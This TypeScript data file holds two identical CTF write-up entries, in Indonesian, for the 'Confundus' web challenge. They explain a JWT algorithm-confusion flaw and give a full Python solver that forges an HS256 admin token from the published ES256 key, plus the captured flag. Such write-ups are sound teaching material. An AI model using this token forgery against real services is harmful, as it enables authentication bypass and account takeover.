import type { WriteUp } from "../types";

export const putcyberWriteups: WriteUp[] = [
  {
    "id": "putcyber-web-confundus",
    "title": "Confundus - Web CTF Walkthrough",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Putcyber",
    "tags": [],
    "description": "Writeup for challenge Confundus - Web CTF Walkthrough",
    "problemDescription": "Target: `http://noauth.putcyberdays.pl:80/`  \nVulnerability utama: **JWT algorithm confusion** + validasi key yang bisa dipaksa jadi HMAC secret.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon Singkat",
        "content": "1. Endpoint penting:\n   - `/login`, `/signup`\n   - `/home` (butuh auth)\n   - `/flag` (butuh `role=admin`)\n   - `/.well-known` (publish public key material)\n2. Source menunjukkan:\n   - Token dibuat sesuai `JWT_ALGORITHM` (default ES256).\n   - Saat verify, fungsi membaca `alg` dari header token attacker, lalu memilih verifier berdasarkan nilai itu.\n   - Jadi attacker bisa kirim token dengan `alg=HS256` walau server normalnya pakai ES256."
      },
      {
        "title": "Akar Masalah",
        "content": "Di `is_valid_JWS`, server:\n1. Parse header token.\n2. Ambil `header['alg']`.\n3. Verifikasi signature memakai algoritma tersebut.\n\nTidak ada pinning ke algoritma server-side untuk token access.  \nIni membuka algorithm confusion.\n\nTambahan bug implementasi: material key publik ES256 dari `/.well-known` bisa dibentuk ulang menjadi byte secret HMAC yang diterima verifier HS256 bila formatnya:\n\n`ecdsa-sha2-nistp256 <base64_key>\\r\\n`\n\nDengan itu, attacker bisa sign token HS256 valid."
      },
      {
        "title": "Exploit",
        "content": "1. Ambil `es256` dari `/.well-known`.\n2. Bentuk secret HMAC:\n   - `b\"ecdsa-sha2-nistp256 \" + es256_blob + b\"\\r\\n\"`\n3. Forge JWT:\n   - Header: `{\"alg\":\"HS256\"}`\n   - Payload:\n     - `iss: example.com`\n     - `aud: example.com`\n     - `exp/iat`: valid timestamp\n     - `role: admin`\n     - `sub: pwn`\n4. Set sebagai cookie `access_token`.\n5. Request `/flag`."
      },
      {
        "title": "Solver",
        "content": "Solver tersimpan di file:\n- [solve.py](/home/nata/ctf/putcyber/web/confundus/app/solve.py)\n\nJalankan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython /home/nata/ctf/putcyber/web/confundus/app/solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport json\r\nimport re\r\nimport time\r\n\r\nimport requests\r\n\r\nBASE_URL = \"http://noauth.putcyberdays.pl:80\"\r\n\r\n\r\ndef b64u(data: bytes) -> str:\r\n    return base64.urlsafe_b64encode(data).decode().rstrip(\"=\")\r\n\r\n\r\ndef forge_admin_token(base_url: str) -> str:\r\n    well_known = requests.get(f\"{base_url}/.well-known\", timeout=10).json()\r\n\r\n    # Server bug: verify key path for ES256 points to OpenSSH pubkey line with CRLF.\r\n    # Algorithm confusion lets us pick HS256 and use that exact bytes as HMAC secret.\r\n    es_blob = well_known[\"es256\"]\r\n    hmac_secret = f\"ecdsa-sha2-nistp256 {es_blob}\\r\\n\".encode()\r\n\r\n    header = {\"alg\": \"HS256\"}\r\n    now = int(time.time())\r\n    payload = {\r\n        \"iss\": \"example.com\",\r\n        \"aud\": \"example.com\",\r\n        \"exp\": now + 3600,\r\n        \"iat\": now,\r\n        \"role\": \"admin\",\r\n        \"sub\": \"pwn\",\r\n    }\r\n\r\n    encoded_header = b64u(json.dumps(header).encode())\r\n    encoded_payload = b64u(json.dumps(payload).encode())\r\n    signing_input = f\"{encoded_header}.{encoded_payload}\".encode()\r\n\r\n    signature = hmac.new(hmac_secret, signing_input, hashlib.sha256).digest()\r\n    encoded_signature = b64u(signature)\r\n    return f\"{encoded_header}.{encoded_payload}.{encoded_signature}\"\r\n\r\n\r\ndef main() -> None:\r\n    token = forge_admin_token(BASE_URL)\r\n    resp = requests.get(\r\n        f\"{BASE_URL}/flag\",\r\n        cookies={\"access_token\": token},\r\n        timeout=10,\r\n    )\r\n    m = re.search(r\"putcCTF\\{[^}]+\\}\", resp.text)\r\n    if m:\r\n        print(m.group(0))\r\n    else:\r\n        print(\"Flag not found\")\r\n        print(resp.status_code)\r\n        print(resp.text[:500])\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "putcCTF{Ju5T_w1nn1ng_t0k3Ns}",
    "lessonsLearned": ""
  },
  {
    "id": "putcyber-web-confundus-app",
    "title": "Confundus - Web CTF Walkthrough",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Putcyber",
    "tags": [],
    "description": "Writeup for challenge Confundus - Web CTF Walkthrough",
    "problemDescription": "Target: `http://noauth.putcyberdays.pl:80/`  \nVulnerability utama: **JWT algorithm confusion** + validasi key yang bisa dipaksa jadi HMAC secret.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon Singkat",
        "content": "1. Endpoint penting:\n   - `/login`, `/signup`\n   - `/home` (butuh auth)\n   - `/flag` (butuh `role=admin`)\n   - `/.well-known` (publish public key material)\n2. Source menunjukkan:\n   - Token dibuat sesuai `JWT_ALGORITHM` (default ES256).\n   - Saat verify, fungsi membaca `alg` dari header token attacker, lalu memilih verifier berdasarkan nilai itu.\n   - Jadi attacker bisa kirim token dengan `alg=HS256` walau server normalnya pakai ES256."
      },
      {
        "title": "Akar Masalah",
        "content": "Di `is_valid_JWS`, server:\n1. Parse header token.\n2. Ambil `header['alg']`.\n3. Verifikasi signature memakai algoritma tersebut.\n\nTidak ada pinning ke algoritma server-side untuk token access.  \nIni membuka algorithm confusion.\n\nTambahan bug implementasi: material key publik ES256 dari `/.well-known` bisa dibentuk ulang menjadi byte secret HMAC yang diterima verifier HS256 bila formatnya:\n\n`ecdsa-sha2-nistp256 <base64_key>\\r\\n`\n\nDengan itu, attacker bisa sign token HS256 valid."
      },
      {
        "title": "Exploit",
        "content": "1. Ambil `es256` dari `/.well-known`.\n2. Bentuk secret HMAC:\n   - `b\"ecdsa-sha2-nistp256 \" + es256_blob + b\"\\r\\n\"`\n3. Forge JWT:\n   - Header: `{\"alg\":\"HS256\"}`\n   - Payload:\n     - `iss: example.com`\n     - `aud: example.com`\n     - `exp/iat`: valid timestamp\n     - `role: admin`\n     - `sub: pwn`\n4. Set sebagai cookie `access_token`.\n5. Request `/flag`."
      },
      {
        "title": "Solver",
        "content": "Solver tersimpan di file:\n- [solve.py](/home/nata/ctf/putcyber/web/confundus/app/solve.py)\n\nJalankan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython /home/nata/ctf/putcyber/web/confundus/app/solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport json\r\nimport re\r\nimport time\r\n\r\nimport requests\r\n\r\nBASE_URL = \"http://noauth.putcyberdays.pl:80\"\r\n\r\n\r\ndef b64u(data: bytes) -> str:\r\n    return base64.urlsafe_b64encode(data).decode().rstrip(\"=\")\r\n\r\n\r\ndef forge_admin_token(base_url: str) -> str:\r\n    well_known = requests.get(f\"{base_url}/.well-known\", timeout=10).json()\r\n\r\n    # Server bug: verify key path for ES256 points to OpenSSH pubkey line with CRLF.\r\n    # Algorithm confusion lets us pick HS256 and use that exact bytes as HMAC secret.\r\n    es_blob = well_known[\"es256\"]\r\n    hmac_secret = f\"ecdsa-sha2-nistp256 {es_blob}\\r\\n\".encode()\r\n\r\n    header = {\"alg\": \"HS256\"}\r\n    now = int(time.time())\r\n    payload = {\r\n        \"iss\": \"example.com\",\r\n        \"aud\": \"example.com\",\r\n        \"exp\": now + 3600,\r\n        \"iat\": now,\r\n        \"role\": \"admin\",\r\n        \"sub\": \"pwn\",\r\n    }\r\n\r\n    encoded_header = b64u(json.dumps(header).encode())\r\n    encoded_payload = b64u(json.dumps(payload).encode())\r\n    signing_input = f\"{encoded_header}.{encoded_payload}\".encode()\r\n\r\n    signature = hmac.new(hmac_secret, signing_input, hashlib.sha256).digest()\r\n    encoded_signature = b64u(signature)\r\n    return f\"{encoded_header}.{encoded_payload}.{encoded_signature}\"\r\n\r\n\r\ndef main() -> None:\r\n    token = forge_admin_token(BASE_URL)\r\n    resp = requests.get(\r\n        f\"{BASE_URL}/flag\",\r\n        cookies={\"access_token\": token},\r\n        timeout=10,\r\n    )\r\n    m = re.search(r\"putcCTF\\{[^}]+\\}\", resp.text)\r\n    if m:\r\n        print(m.group(0))\r\n    else:\r\n        print(\"Flag not found\")\r\n        print(resp.status_code)\r\n        print(resp.text[:500])\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "putcCTF{Ju5T_w1nn1ng_t0k3Ns}",
    "lessonsLearned": ""
  }
];
